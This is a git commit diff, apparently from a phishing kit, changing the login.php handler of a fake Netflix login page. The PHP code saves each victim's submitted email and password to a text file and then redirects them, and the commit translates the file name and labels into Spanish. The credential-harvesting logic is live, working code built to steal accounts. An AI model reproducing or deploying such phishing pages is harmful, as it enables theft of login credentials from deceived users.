be66f4915a85dc77ed90eeb5c12dbc8fb426b681
Euronymou5 <85043356+Euronymou5@users.noreply.github.com>
2021-12-13 18:23:55 -0600

    Update login.php

--- pages/Netflix/login.php
+++ pages/Netflix/login.php
@@ -1,7 +1,7 @@
 <?php
 include 'ip.php';
 
-file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+file_put_contents("usuarios.txt", "Cuenta: " . $_POST['email'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: <CUSTOM>');
 exit();
 
